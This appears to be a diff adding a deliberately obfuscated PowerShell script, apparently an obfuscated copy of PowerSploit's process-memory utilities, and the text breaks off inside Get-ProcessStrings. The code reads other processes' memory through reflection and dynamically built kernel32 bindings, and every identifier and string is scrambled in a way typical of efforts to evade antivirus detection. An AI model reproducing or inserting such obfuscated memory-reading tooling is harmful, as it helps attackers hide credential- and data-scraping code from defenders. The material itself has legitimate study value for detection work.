@@ -1,0 +1,395 @@
+  &("{0}{2}{1}"-f 's','-iteM','et')  ("{0}{2}{1}{4}{3}"-f'VA','bLE','rIA','D9Mj',':l8') ( [Type]("{0}{1}{2}{3}" -f 'di','AgnO','STIcs.prOC','ESS') );  &("{1}{0}" -f 'Et','S') ("b1"+"7Cx") ([tYpe]("{2}{0}{1}"-F 'pPDOM','AIN','a')  ) ;  &("{2}{0}{3}{1}" -f'e','aBLe','S','T-vaRi') ("{0}{1}" -f 'HQw6J','o')  ( [tYpe]("{5}{7}{1}{3}{6}{4}{0}{2}"-f 'R','M','aCcESs','IT.','bUILDE','rEFleCTi','aSsEMblY','On.e'))  ;&("{0}{1}{2}" -f 'sET','-IT','EM') ("VaRIAb"+"L"+"E:5p2") ( [type]("{0}{1}" -f'ui','nt32') );&("{1}{0}{2}" -f 'ite','set-','m')  ("{2}{0}{1}"-f'AblE',':lKf','VaRI') (  [tyPe]("{2}{0}{5}{3}{6}{4}{1}"-f'flEc','TIONS','RE','lInG','Ven','TIOn.Cal','Con'))  ;    &("{2}{1}{0}"-f'ArIAble','Et-V','S') ('3i1'+'0k') ([tyPe]("{0}{8}{2}{6}{4}{5}{9}{7}{1}{3}" -F 'RuN','GcONvEN','ime.INTERo','tiON','E','rVICes.','Ps','lLiN','t','ca')  );   ${uY`Z01}  =[TypE]("{2}{0}{1}" -F'v','atoR','ACtI')  ; &("{2}{0}{1}"-f'tE','M','sET-I') ("{0}{2}{1}{3}" -f 'var','bLe:','IA','qcVk')  (  [TYpE]("{0}{1}" -F 'IntP','TR') )  ;  &('sV')  ("{1}{0}" -f'RN','0')  ([tyPe]("{0}{1}" -F 'IN','t')  ) ;    &("{1}{0}{2}{3}"-f'arI','SEt-V','AB','LE') ("{1}{0}" -f '1K','45')  ([TyPe]("{3}{1}{2}{4}{0}{5}" -f 'SERVICes.MArs','ntiMe.iNTE','Ro','RU','P','haL')) ;  function gET-Vi`R`TUALmEMory`in`FO {
+
+
+    Param (
+        [Parameter(POsITION = 0, mANDaTOry = ${t`RUe})]
+        [ValidateScript({&("{1}{0}{2}" -f't-Proce','Ge','ss') -Id ${_}})]
+        [Int]
+        ${PRo`ce`sSiD},
+
+        [Parameter(positiON = 1, mAnDAtoRy = ${t`RuE})]
+        [IntPtr]
+        ${M`odu`LeBaSeAD`DRESS},
+
+        [Int]
+        ${paGE`Size} = 0x1000
+    )
+
+    ${m`OD} = &("{3}{0}{2}{1}{4}"-f'emo','M','ry','New-InM','odule') -ModuleName ("{1}{2}{0}" -f'Utils','Me','m')
+
+    ${ME`MPRoT`ect`IoN} = &("{1}{0}" -f'num','pse') ${m`od} ("{1}{2}{5}{3}{0}{6}{4}"-f 'P','MEMUTI','L.','EM_','TECT','M','RO') ("{1}{0}" -f't32','In') @{
+        ("{2}{0}{1}" -f'T','E','PAGE_EXECU') =           0x00000010
+        ("{1}{5}{3}{4}{0}{2}" -f 'REA','PA','D','_EXE','CUTE_','GE') =      0x00000020
+        ("{0}{1}{4}{3}{2}" -f'PAGE','_EXECUTE_READW','E','IT','R') = 0x00000040
+        ("{4}{1}{2}{3}{0}" -f'Y','_WRITE','C','OP','PAGE_EXECUTE') = 0x00000080
+        ("{0}{2}{1}"-f 'PAGE_NO','SS','ACCE') =          0x00000001
+        ("{2}{0}{1}"-f'E_READON','LY','PAG') =          0x00000002
+        ("{0}{1}{2}"-f'PAGE','_READWRI','TE') =         0x00000004
+        ("{2}{0}{1}"-f'O','PY','PAGE_WRITEC') =         0x00000008
+        ("{1}{0}{2}" -f'E_GUAR','PAG','D') =             0x00000100
+        ("{1}{2}{0}"-f 'NOCACHE','PA','GE_') =           0x00000200
+        ("{2}{3}{4}{0}{1}{5}" -f 'IT','ECO','PA','G','E_WR','MBINE') =      0x00000400
+    } -Bitfield
+
+    ${MEmST`A`TE} = &("{0}{1}"-f 'psen','um') ${M`oD} ("{2}{0}{1}{3}"-f'EM','UTIL.','M','MEM_STATE') ("{1}{0}"-f '32','Int') @{
+        ("{1}{0}{2}"-f 'EM_COMMI','M','T') =  0x00001000
+        ("{2}{1}{0}"-f 'E','M_FRE','ME') =    0x00010000
+        ("{2}{1}{0}"-f'VE','RESER','MEM_') = 0x00002000
+    } -Bitfield
+
+    ${meMt`ypE} = &("{1}{0}"-f'um','psen') ${M`Od} ("{2}{1}{0}"-f'YPE','MUTIL.MEM_T','ME') ("{1}{0}" -f 'nt32','I') @{
+        ("{0}{1}" -f'MEM_IMAG','E') =   0x01000000
+        ("{0}{2}{1}"-f 'M','D','EM_MAPPE') =  0x00040000
+        ("{1}{0}{2}"-f 'M_P','ME','RIVATE') = 0x00020000
+    } -Bitfield
+
+    if ( ( &('gi')  ("{1}{2}{3}{0}{4}"-f 'v','Variab','lE',':Qc','K')).VaLuE::"s`iZe" -eq 4) {
+        ${memOry_bASIC`_i`NForm`A`TIOn} = &("{2}{1}{0}" -f't','ruc','st') ${M`Od} ("{2}{8}{3}{7}{6}{4}{0}{5}{9}{1}"-f 'ASIC_','N','MEM','M','B','IN','Y_','EMOR','UTIL.','FORMATIO') @{
+            ("{0}{1}{2}"-f 'Ba','seAddres','s') = &("{0}{1}"-f 'fi','eld') 0 ("{0}{1}"-f'In','t32')
+            ("{0}{2}{3}{1}" -f'Alloca','e','tion','Bas') = &("{1}{0}"-f'd','fiel') 1 ("{1}{0}" -f'32','Int')
+            ("{2}{0}{3}{1}" -f 'cationP','ect','Allo','rot') = &("{0}{1}" -f 'f','ield') 2 ${MEM`PR`oTE`cti`on}
+            ("{1}{2}{0}"-f 'nSize','Re','gio') = &("{0}{1}" -f'fi','eld') 3 ("{0}{1}" -f'Int3','2')
+            ("{0}{1}"-f'St','ate') = &("{1}{0}" -f 'd','fiel') 4 ${meMST`Ate}
+            ("{2}{1}{0}"-f'ct','rote','P') = &("{0}{1}"-f'fi','eld') 5 ${M`EmPROTEc`T`ioN}
+            ("{0}{1}" -f 'Typ','e') = &("{1}{0}" -f'ield','f') 6 ${M`E`mTyPE}
+        }
+    } else {
+        ${mEm`oRy_`B`ASic_iNFOr`MATIOn} = &("{0}{1}"-f'struc','t') ${M`od} ("{1}{5}{2}{0}{4}{7}{6}{8}{3}"-f 'OR','ME','IL.MEM','N','Y_BA','MUT','O','SIC_INF','RMATIO') @{
+            ("{2}{0}{1}" -f'eA','ddress','Bas') = &("{1}{0}" -f 'eld','fi') 0 ("{1}{0}" -f't64','In')
+            ("{0}{2}{3}{4}{1}" -f'All','se','oca','tion','Ba') = &("{0}{1}" -f 'fi','eld') 1 ("{1}{0}"-f '64','Int')
+            ("{2}{0}{1}{3}" -f 'cat','io','Allo','nProtect') = &("{1}{0}"-f'ield','f') 2 ${m`E`mPROtE`C`TIoN}
+            ("{0}{2}{1}"-f 'A','t1','lignmen') = &("{1}{0}"-f 'ld','fie') 3 ("{1}{0}" -f'2','Int3')
+            ("{1}{2}{0}"-f'ze','Reg','ionSi') = &("{0}{1}"-f 'f','ield') 4 ("{1}{0}"-f 't64','In')
+            ("{1}{0}" -f'ate','St') = &("{1}{0}" -f'd','fiel') 5 ${Me`mS`Tate}
+            ("{1}{0}"-f'otect','Pr') = &("{0}{1}"-f'fie','ld') 6 ${m`Em`Pr`oTe`CTIOn}
+            ("{1}{0}"-f'e','Typ') = &("{1}{0}"-f 'd','fiel') 7 ${mEMT`y`Pe}
+            ("{0}{2}{1}" -f'A','nment2','lig') = &("{0}{1}" -f'f','ield') 8 ("{0}{1}" -f'Int3','2')
+        }
+    }
+
+    ${Fu`NC`Ti`onD`e`F`iNiTionS} = @(
+        (&("{0}{1}" -f'f','unc') ("{2}{1}{0}" -f'l32','e','kern') ("{2}{3}{0}{1}" -f'tualQ','ueryEx','Vi','r') ([Int32]) @([IntPtr], [IntPtr], ${MeMo`RY_baSic`_`INf`Or`matIOn}.("{2}{1}{0}"-f'pe','keByRefTy','Ma').Invoke(), [Int]) -SetLastError),
+        (&("{0}{1}" -f'f','unc') ("{2}{0}{1}"-f 'r','nel32','ke') ("{1}{2}{3}{0}"-f 's','O','penP','roces') ([IntPtr]) @([UInt32], [Bool], [UInt32]) -SetLastError),
+        (&("{1}{0}" -f 'unc','f') ("{1}{2}{0}"-f 'el32','k','ern') ("{2}{1}{0}{3}" -f 'eHan','os','Cl','dle') ([Bool]) @([IntPtr]) -SetLastError)
+    )
+
+    ${T`Ypes} = ${Fun`C`TioN`dEfINItIonS} | &("{0}{1}{3}{2}"-f 'Add','-','pe','Win32Ty') -Module ${M`oD} -Namespace ("{0}{2}{1}{3}" -f'Win','emU','32M','tils')
+    ${kE`RN`EL32} = ${tY`P`eS}[("{1}{0}{2}"-f 'l3','kerne','2')]
+
+    
+    ${Hp`RO`cEsS} = ${K`eR`Nel32}::("{0}{1}{2}" -f'Op','enProces','s').Invoke(0x400, ${fAL`se}, ${pr`oCE`sS`iD}) 
+
+    if (-not ${hP`R`OCe`SS}) {
+        throw ('U'+'nable'+' '+'t'+'o '+'ge'+'t '+'a '+'pro'+'c'+'ess '+'h'+'an'+'dle '+'for'+' '+'proces'+'s '+'ID:'+' '+"$ProcessID")
+    }
+
+    ${mEMo`R`yi`NFO} = &("{2}{1}{0}"-f 't','Objec','New-') ${MemorY`_BaSIC_`Info`RM`AT`i`oN}
+    ${bY`T`ES`REad} = ${k`ernEl`32}::"viRtU`Al`q`UEryeX"(${HPR`O`CESs}, ${modulebASea`dD`Re`sS}, [Ref] ${MEmo`Ry`i`NFO}, ${paG`E`sIZe})
+
+    ${n`ULl} = ${kE`RNeL`32}::("{0}{1}{3}{2}"-f'Clo','s','Handle','e').Invoke(${hpr`Oc`eSS})
+
+    ${F`Iel`ds} = @{
+        ("{2}{3}{0}{1}"-f 're','ss','Bas','eAdd') = ${mEm`Or`Y`infO}."b`AsEADDre`ss"
+        ("{1}{0}{3}{2}" -f 'oc','All','Base','ation') = ${mE`MO`RYiNfO}."A`LloC`AtiOnbaSE"
+        ("{2}{1}{3}{0}" -f'ct','P','Allocation','rote') = ${meM`oR`yiN`FO}."al`lOC`Ati`oNpR`OTe`CT"
+        ("{1}{0}{2}" -f'ionS','Reg','ize') = ${M`e`MoRYInfO}."R`e`gi`oNsIZe"
+        ("{0}{1}"-f 'St','ate') = ${M`E`MORYInFo}."st`Ate"
+        ("{0}{2}{1}"-f'Pro','ect','t') = ${mEmO`RYi`NfO}."PR`oTe`Ct"
+        ("{1}{0}" -f 'pe','Ty') = ${ME`MOr`y`iNfO}."tY`Pe"
+    }
+
+    ${ResU`LT} = &("{2}{1}{3}{0}" -f 't','bj','New-O','ec') ("{1}{0}"-f'ject','PSOb') -Property ${FiE`Lds}
+    ${Re`SULt}."PsO`Bj`Ect"."t`YPenA`mES".("{1}{0}"-f'sert','In').Invoke(0, ("{1}{0}{2}"-f 'F','MEM.IN','O'))
+
+    ${R`E`Sult}
+}
+
+function GEt-`sTrUCtFRo`mMEMO`Ry {
+
+
+    [CmdletBinding()] Param (
+        [Parameter(PosiTION = 0, ManDAtorY = ${T`RuE})]
+        [Alias({"{0}{1}{2}" -f 'Pr','oc','essId'})]
+        [Alias('PID')]
+        [UInt16]
+        ${ID},
+
+        [Parameter(PoSItioN = 1, MANDAtORY = ${tR`UE})]
+        [IntPtr]
+        ${m`eMORY`A`ddResS},
+
+        [Parameter(POsITIoN = 2, ManDaTory = ${TR`Ue})]
+        [Alias({"{0}{1}"-f 'Typ','e'})]
+        [Type]
+        ${s`Tr`UCttY`PE}
+    )
+
+    &("{4}{3}{2}{0}{1}" -f 'od','e','M','ict','Set-Str') -Version 2
+
+    ${prO`cEs`s_vm_`R`eaD} = 0x0010 
+
+    
+    ${gET`ProcESsH`AN`dLE} =  ( &('Gi')  ("{0}{2}{1}{3}" -f 'V','iAB','Ar','Le:l8D9MJ')  ).vaLUE.("{0}{1}{2}" -f'GetMe','tho','d').Invoke(("{4}{2}{1}{0}{3}" -f 'o','Pr','et','cessHandle','G'), [Reflection.BindingFlags] ("{4}{0}{2}{3}{1}"-f 'li','ance','c, Ins','t','NonPub'), ${NU`lL}, @([Int]), ${n`ULL})
+
+    try
+    {
+        
+        ${pROC`E`Ss} = &("{1}{3}{0}{2}" -f'o','Ge','cess','t-Pr') -Id ${I`d} -ErrorVariable ("{1}{2}{0}" -f'ssError','GetPr','oce')
+        
+        ${hAn`d`lE} = ${pR`oc`ess}."hAnd`Le"
+    }
+    catch [Exception]
+    {
+        throw ${g`etPrOce`SSeR`R`Or}
+    }
+
+    if (${H`A`Ndle} -eq ${nu`lL})
+    {
+        throw ('U'+'na'+'ble '+'t'+'o '+'obtain'+' '+'a '+'hand'+'le'+' '+'fo'+'r '+'PID'+' '+"$Id. "+'Yo'+'u '+'wil'+'l '+'likel'+'y'+' '+'n'+'eed '+'to'+' '+'run'+' '+'this'+' '+'sc'+'ri'+'pt '+'el'+'evated'+'.')
+    }
+
+    
+    ${MS`cor`liB} =   ${B1`7Cx}::"cU`RR`e`NtdOMa`In".("{0}{1}{2}" -f 'GetAssembl','ie','s').Invoke() | &('?') { ${_}."Ful`l`NamE".("{0}{1}"-f'Spl','it').Invoke(',')[0].("{0}{1}"-f'ToL','ower').Invoke() -eq ("{0}{1}{2}" -f'mscor','li','b') }
+    ${WIN`32N`Ati`Ve} = ${msCo`Rl`iB}.("{0}{2}{1}" -f'Get','ypes','T').Invoke() | &('?') { ${_}."f`ULLna`ME" -eq ("{4}{3}{0}{2}{5}{1}{6}"-f 'cr','n32Nat','osoft.Win32.W','i','M','i','ive') }
+    ${mEMoRY`_BA`s`ic_InFoR`mA`TIon} = ${wi`N32nA`TIve}.("{1}{0}{2}{3}"-f 'etNest','G','edTyp','e').Invoke(("{5}{3}{4}{2}{1}{0}"-f'N','IO','T','SIC','_INFORMA','MEMORY_BA'), [Reflection.BindingFlags] ("{0}{1}{2}"-f 'NonPu','bl','ic'))
+
+    if (${Memo`Ry_B`ASIC_Inf`o`RmAtiON} -eq ${N`Ull})
+    {
+        throw ("{1}{13}{10}{17}{15}{8}{9}{4}{0}{16}{6}{5}{14}{12}{7}{2}{3}{11}"-f 'to','Unab','NFORMATION s','tru','e ','B','RY_','_I','n','c','et a r','cture.','C','le to g','ASI','ere',' the MEMO','ef')
+    }
+
+    
+    ${Pr`o`Tect`Fi`Eld} = ${Me`mOr`Y_ba`SIc_in`F`OrmA`T`IoN}.("{2}{1}{0}" -f'd','l','GetFie').Invoke(("{0}{1}{2}"-f'Pro','tec','t'), [Reflection.BindingFlags] ("{2}{5}{3}{1}{0}{4}" -f'anc',' Inst','NonP','ic,','e','ubl'))
+    ${AlLoC`AtIonB`A`s`EFI`ELd} = ${mE`MORy_B`As`IC`_infOr`Ma`Ti`on}.("{1}{2}{0}" -f 'Field','Ge','t').Invoke(("{2}{0}{3}{1}" -f's','Address','Ba','e'), [Reflection.BindingFlags] ("{1}{2}{4}{5}{3}{6}{0}"-f 'ance','No','nP',' In','ubli','c,','st'))
+    ${reg`io`NSI`zeFI`ElD} = ${meMoRY`_B`AsiC`_I`NforMaT`i`On}.("{2}{1}{0}" -f 'eld','tFi','Ge').Invoke(("{1}{0}{2}" -f 'egion','R','Size'), [Reflection.BindingFlags] ("{3}{2}{1}{0}" -f'ance','t','onPublic, Ins','N'))
+
+    try { ${N`AT`iv`eUtiLs} = [NativeUtils] } catch [Management.Automation.RuntimeException] 
+    {
+        
+        ${d`Yn`ASsEMBLy} = &("{0}{2}{1}"-f 'New','ect','-Obj') ("{6}{2}{3}{0}{1}{5}{4}"-f '.','A','t','ion','lyName','ssemb','Reflec')(("{1}{0}{2}" -f 'ack','MemH','er'))
+        ${a`SSembLy`Bui`LDeR} =  ${b`1`7cX}::"c`URR`eNTDom`AIn"."D`eFIN`edy`NaMicAsseMBLY"(${DyNasSe`M`BLy},  ${H`Q`W6jO}::"r`UN")
+        ${MOdulEb`UilD`eR} = ${aSs`emBl`YbuI`L`d`ER}.("{0}{3}{5}{4}{1}{2}" -f'Def','o','dule','ineDy','amicM','n').Invoke(("{1}{2}{0}" -f 'mHacker','M','e'), ${fa`LSE})
+        ${At`Trib`UteS} = ("{8}{7}{10}{15}{0}{14}{17}{4}{5}{3}{9}{12}{6}{2}{13}{16}{11}{1}" -f'lass, Class, P','it','led, Be','ential','q','u',' Sea','A','AutoLayout, ','Lay','nsi','n','out,','foreFi','ublic, S','C','eldI','e')
+        ${TyP`E`BUIlD`er} = ${ModUlEb`UIL`d`eR}.("{1}{0}{2}" -f 'n','Defi','eType').Invoke(("{2}{1}{0}{3}" -f 'i','eUt','Nativ','ls'), ${ATT`RIBU`TEs}, [ValueType])
+        ${typ`E`BUIl`Der}.("{3}{0}{2}{4}{1}"-f'e','vokeMethod','fineP','D','In').Invoke(("{1}{0}{2}{3}" -f 'ces','ReadPro','sM','emory'), ("{1}{3}{0}{2}"-f 'l','kernel3','l','2.d'), [Reflection.MethodAttributes] ("{3}{4}{2}{0}{1}" -f'tati','c','S','Pu','blic, '),   ${L`Kf}::"sTANd`ARD", [Bool], @([IntPtr], [IntPtr], [IntPtr], [UInt32],  ( &("{0}{3}{1}{2}"-f 'gE','a','RiablE','t-V') ("5"+"p2")).vALuE.("{0}{2}{3}{1}" -f'Mak','ype','e','ByRefT').Invoke()),  (&("{1}{0}" -f'-iTeM','get') ("{2}{3}{1}{0}" -f'aBLe:3i10k','i','V','aR')).VALue::"W`i`NApI", ("{0}{1}" -f'Aut','o')) | &("{1}{0}{2}" -f'u','O','t-Null')
+        ${tYpE`BU`i`LDer}.("{1}{4}{3}{2}{0}"-f 'Method','De','oke','Inv','fineP').Invoke(("{2}{0}{1}" -f'irtualQueryE','x','V'), ("{3}{0}{2}{1}" -f'er','2.dll','nel3','k'), [Reflection.MethodAttributes] ("{3}{1}{2}{0}"-f 'atic','blic, ','St','Pu'),   ( &("{0}{1}{3}{2}" -f 'ge','T-','IABle','var')  ("{0}{1}"-f 'lk','f')  ).VaLUE::"STAnD`ArD", [UInt32], @([IntPtr], [IntPtr], ${Me`MORy_Bas`I`C_infOR`m`Ati`oN}.("{2}{1}{0}" -f 'pe','y','MakeByRefT').Invoke(), [UInt32]),  ${3i`10K}::"w`INapI", ("{1}{0}"-f'to','Au')) | &("{1}{0}{2}"-f'ut','O','-Null')
+
+        ${NAti`Veut`i`Ls} = ${tYPE`BUi`lDER}.("{2}{1}{0}"-f 'e','ateTyp','Cre').Invoke()
+    }
+
+    
+    try
+    {
+        ${sAF`Ehan`dLE} = ${get`p`RoCeSshAn`dLe}."IN`VOKE"(${pR`OCe`SS}, @(${prOcess_`Vm_Re`Ad}))
+        ${HanD`lE} = ${sAFe`HA`NdLE}.("{3}{2}{1}{0}" -f'e','usGetHandl','angero','D').Invoke()
+    }
+    catch
+    {
+        throw ${err`Or}[0]
+    }
+
+    
+    ${mEm`orYBaSICinFO`RMaT`iON} =  (  &("{2}{0}{1}"-f 'i','aBLE','vAR') ("{0}{1}"-f'U','YZ01')  -vALu  )::("{3}{2}{1}{0}"-f'nce','ta','reateIns','C').Invoke(${meMo`R`y_bA`SI`C_In`Fo`RMATI`oN})
+
+    
+    ${N`AtI`VEut`ILs}::"vIRTua`LQ`UE`RyEx"(${H`AnDLE}, ${m`em`ORy`AdDReSs}, [Ref] ${mEMorY`BASi`ci`N`F`ORMAtIon},  (  &("{1}{2}{0}" -f'e','vArIAB','L')  ("{0}{1}"-f '4','51k')  -vaLueoNl )::"s`I`ZeOF"([Type] ${m`EMO`RY`_`BASIc_In`FOr`mat`IOn})) | &("{0}{1}{2}" -f'Out-','N','ull')
+
+    ${PaGe_EX`ECUT`E`_rE`AD} = 0x20
+    ${pAGE_E`X`ECute`_r`Ea`dWR`ITe} = 0x40
+    ${paGE_`R`eadon`lY} = 2
+    ${p`A`GE_ReADw`Ri`Te} = 4
+
+    ${PROt`E`CTION} = ${P`RoteC`T`F`IELD}.("{0}{1}{2}"-f'Ge','tValu','e').Invoke(${ME`Mo`RYbAS`ICINFOrM`AtIOn})
+    ${alLoCaTi`onbaS`e`ORI`Gin`AL} = ${aL`l`OC`AtioNBA`SEField}.("{2}{0}{1}"-f 'u','e','GetVal').Invoke(${MeMo`RY`B`ASICi`NFOR`maTI`ON})
+    ${gETP`o`InTEr`VA`lUE} = ${aL`lOcatIonbaSE`ORI`gi`NaL}.("{1}{0}" -f'e','GetTyp').Invoke().("{0}{2}{1}" -f 'GetMe','d','tho').Invoke(("{2}{3}{0}{1}" -f 'al','ue','Ge','tPointerV'), [Reflection.BindingFlags] ("{2}{4}{1}{0}{3}" -f 'lic','ub','N',', Instance','onP'))
+    ${ALl`OcATION`Base} = ${gE`TPOINtEr`V`ALUe}."InV`oKE"(${A`LL`oCA`TiO`NBasEorI`GiNaL}, ${nu`lL}).("{1}{0}" -f '4','ToInt6').Invoke()
+    ${r`E`gio`NsiZE} = ${ReGiO`NSI`Z`eFIE`LD}.("{2}{0}{1}"-f'tValu','e','Ge').Invoke(${mE`mOr`YbaSI`Cinf`orma`TI`On}).("{2}{0}{1}"-f'UI','nt64','To').Invoke()
+
+    &("{2}{0}{1}" -f'Ver','bose','Write-') ('Prote'+'ct'+'ion:'+' '+"$Protection")
+    &("{1}{0}{2}{3}" -f'-Ver','Write','b','ose') ('Allo'+'cat'+'ionB'+'ase: '+"$AllocationBase")
+    &("{2}{0}{1}"-f 'te-V','erbose','Wri') ('Regio'+'nSize'+':'+' '+"$RegionSize")
+
+    if ((${pr`OTect`i`oN} -ne ${P`A`g`E_READo`NLY}) -and (${Pr`o`TECtiON} -ne ${PaGE_`R`eADWR`iTe}) -and (${pRo`TeC`TIOn} -ne ${p`AgE`_EXe`c`UT`e_ReaD}) -and (${pRot`e`cTIoN} -ne ${PAGe_`eXeCu`Te_r`e`ADwri`TE}))
+    {
+        ${Safeh`ANd`lE}.("{1}{0}"-f 'ose','Cl').Invoke()
+        throw ("{4}{6}{2}{3}{8}{7}{5}{0}{1}"-f 'ac','cess.','cified',' does','The address sp','ot have read ','e','n',' ')
+    }
+
+    ${StR`Uc`TSI`ZE} =   ( &('Gi')  ("{2}{1}{3}{0}"-f'451k','Ble','VaRia',':') ).VAlue::"s`iZ`eOf"([Type] ${st`RUCtT`YpE})
+    ${eN`DO`F`Al`lOCaTIon} = ${AlLOcAT`iON`BA`Se} + ${r`Eg`i`oNSize}
+    ${e`N`dOf`struCT} = ${mEmOry`AddR`Ess}.("{0}{2}{1}"-f'To','t64','In').Invoke() + ${sT`R`UcTS`IZe}
+
+    if (${EnD`ofs`TrUct} -gt ${eNdoF`A`llo`CatION})
+    {
+        ${sAFE`ha`ND`Le}.("{0}{1}"-f 'Clos','e').Invoke()
+        throw ("{3}{15}{0}{11}{2}{5}{9}{6}{14}{10}{8}{4}{12}{1}{7}{13}"-f' ',' ','t','Y','at wa','t','ng to read ','al','ond wh','empti','y','a','s','located.','be','ou are')
+    }
+
+    try
+    {
+        
+        ${lOC`AL`sT`RUcTPTr} =   ${45`1k}::("{1}{2}{0}{3}" -f 'HG','Al','loc','lobal').Invoke(${sTRu`C`Ts`IZe})
+    }
+    catch [OutOfMemoryException]
+    {
+        throw &("{0}{2}{1}" -f'Er','r[0]','ro')
+    }
+
+    &("{4}{1}{3}{0}{2}"-f 's','e-Ver','e','bo','Writ') "Memory allocated at 0x$($LocalStructPtr.ToString("X$([IntPtr]::Size * 2)")) "
+
+    
+    
+    
+    ${Ze`ROb`y`TES} = &("{0}{2}{1}"-f'New-Ob','t','jec') ("{0}{1}"-f'B','yte[]')(${STr`UctS`iZe})
+      ${4`51K}::("{1}{0}" -f 'opy','C').Invoke(${ZeR`OBY`T`es}, 0, ${lo`cA`lsTRuCt`ptR}, ${S`TrU`cts`Ize})
+
+    ${Byt`ES`RE`Ad} = [UInt32] 0
+
+    if (${N`ATiVe`UTILs}::("{3}{4}{1}{2}{5}{0}" -f 'y','ce','ssMemo','ReadP','ro','r').Invoke(${ha`ND`lE}, ${MEM`ORYa`dDr`EsS}, ${Loc`AlSt`RUCt`ptr}, ${sT`Ru`CTsI`Ze}, [Ref] ${ByTE`S`ReAD}))
+    {
+        ${safe`h`An`DLE}.("{0}{1}" -f 'Cl','ose').Invoke()
+          (  &("{1}{0}"-f 'TEM','i')  ("{1}{2}{3}{0}"-f ':451k','VarI','ABl','E')  ).VALue::("{0}{1}{2}" -f'FreeH','Glo','bal').Invoke(${LoCa`L`sTRU`CtP`TR})
+        throw ([ComponentModel.Win32Exception]  ( &("{0}{1}{2}" -f 'va','riAbL','e')  ("{0}{1}"-f '45','1K') -vALueo)::("{1}{0}{3}{2}" -f 'etL','G','32Error','astWin').Invoke())
+    }
+
+    &("{2}{3}{0}{1}"-f 'rbo','se','Write-V','e') ('St'+'ru'+'ct '+'Si'+'z'+'e: '+"$StructSize")
+    &("{3}{0}{1}{2}{4}" -f 'e-V','er','bos','Writ','e') ('B'+'y'+'tes '+'re'+'a'+'d: '+"$BytesRead")
+
+    ${PaRs`E`DStr`UcT} =   ${4`51K}::"PtRtOst`RucT`UrE"(${Lo`cAL`S`TR`UcTPTR}, [Type] ${str`Uc`TtYPe})
+
+      ( &("{0}{2}{1}"-f'g','M','ET-chIldIte')  ('v'+'aR'+'IaBL'+'e:451'+'K') ).vALuE::("{2}{1}{3}{0}"-f 'obal','eH','Fre','Gl').Invoke(${Lo`cAlST`RUCT`PTr})
+    ${SAfehA`N`DLE}.("{1}{0}"-f 'se','Clo').Invoke()
+
+    &("{0}{1}{3}{2}"-f'Wri','t','Output','e-') ${p`ArSeD`stR`UCt}
+}
+
+filter gET`-p`Ro`cEsSmeMorYI`NFo {
+
+
+    Param (
+        [Parameter(PARAMETERsEtname = "In`M`emorY", POsiTIoN = 0, mAndAtory = ${t`RuE}, VAlUeFromPIpELInEbypRoperTYNamE = ${T`Rue})]
+        [Alias('Id')]
+        [ValidateScript({&("{0}{1}{2}" -f 'Get','-Proces','s') -Id ${_}})]
+        [Int]
+        ${p`R`o`cEssID}
+    )
+
+    ${S`Ysi`NFo} = &("{1}{0}{2}{3}{4}"-f 't-Sy','Ge','ste','m','Info')
+
+    ${ME`MOR`yIn`FO} = &("{3}{6}{5}{2}{1}{0}{4}" -f 'or','Mem','l','Get-Virt','yInfo','a','u') -ProcessID ${proC`e`sSiD} -ModuleBaseAddress ( (&("{1}{2}{0}"-f'E','G','et-VArIABl')  ("{1}{0}"-f 'vK','QC') -VAl  )::"ZE`Ro") -PageSize ${SYSi`NFO}."pa`ges`ize"
+
+    ${M`EmOR`y`InFo}
+
+    while ((${M`emORYIn`Fo}."Ba`SeadDR`E`Ss" + ${meMo`RY`INfo}."r`egio`NSIzE") -lt ${S`ySi`NFO}."MA`x`IMUma`PPlIcA`TIO`NA`Dd`ReSS") {
+        ${B`AS`eaLlOcaTi`on} = [IntPtr] (${MemorY`I`NfO}."BAseA`D`dre`ss" + ${MeMOrYI`N`FO}."RE`giONs`IzE")
+        ${mem`oR`yInFo} = &("{0}{2}{6}{3}{5}{4}{1}"-f 'Ge','fo','t','rtua','n','lMemoryI','-Vi') -ProcessID ${pROC`Ess`id} -ModuleBaseAddress ${b`AS`eaLLOca`TIon} -PageSize ${s`ysIn`FO}."p`AgESi`Ze"
+        
+        if (${m`emo`RyINFo}."sTa`Te" -eq 0) { break }
+        ${m`em`oRY`iNFO}
+    }
+}
+
+function G`Et-PRO`CES`SStRiN`gS
+{
+
+
+    [CmdletBinding()] Param (
+        [Parameter(POsiTiOn = 0, MAndaToRy = ${t`Rue}, vAlUEFRomPiPElIneByPRopERtyNaME = ${Tr`UE})]
+        [Alias('Id')]
+        [ValidateScript({&("{2}{3}{1}{0}"-f 'ss','roce','G','et-P') -Id ${_}})]
+        [Int32]
+        ${Pr`oC`eSs`Id},
+
+        [UInt16]
+        ${MiN`IMUmLeNg`Th} = 3,
+
+        [ValidateSet({"{2}{0}{1}" -f'u','lt','Defa'},{"{0}{1}"-f'A','scii'},{"{2}{1}{0}"-f 'ode','nic','U'})]
+        [String]
+        ${eNco`Di`Ng} = ("{0}{1}" -f'D','efault'),
+
+        [Switch]
+        ${IncLu`Dei`MaGES}
+    )
+
+    BEGIN {
+        ${m`Od} = &("{4}{3}{0}{1}{2}" -f'InMemor','yM','odule','w-','Ne') -ModuleName ("{1}{2}{3}{0}"-f'trings','Proc','es','sS')
+
+        ${fuN`CtIonde`F`inI`TIons} = @(
+            (&("{0}{1}"-f'f','unc') ("{2}{1}{0}"-f'2','l3','kerne') ("{2}{3}{1}{0}" -f 'ess','nProc','O','pe') ([IntPtr]) @([UInt32], [Bool], [UInt32]) -SetLastError),
+            (&("{1}{0}"-f 'nc','fu') ("{0}{1}"-f'kernel3','2') ("{1}{3}{0}{2}"-f'em','ReadProc','ory','essM') ([Bool]) @([IntPtr], [IntPtr], [Byte[]], [Int],  ( &("{0}{2}{1}" -f 'Ch','M','ILdite') ("{1}{0}{2}" -f'rIaBlE','Va',':0RN')).vALue.("{4}{1}{0}{2}{3}"-f'yRefT','akeB','y','pe','M').Invoke()) -SetLastError),
+            (&("{1}{0}" -f'unc','f') ("{0}{1}" -f'ke','rnel32') ("{2}{3}{1}{0}"-f'le','and','Close','H') ([Bool]) @([IntPtr]) -SetLastError)
+        )
+
+        ${tyP`es} = ${f`U`NCtiON`DefIn`i`Ti`ONS} | &("{0}{1}{2}"-f 'Add-Win32T','y','pe') -Module ${m`oD} -Namespace ("{4}{1}{3}{2}{0}{5}"-f'sSt','c','s','e','Win32Pro','rings')
+        ${k`E`Rn`eL32} = ${T`YpEs}[("{1}{2}{0}"-f 'l32','k','erne')]
+    }
+    
+    PROCESS {
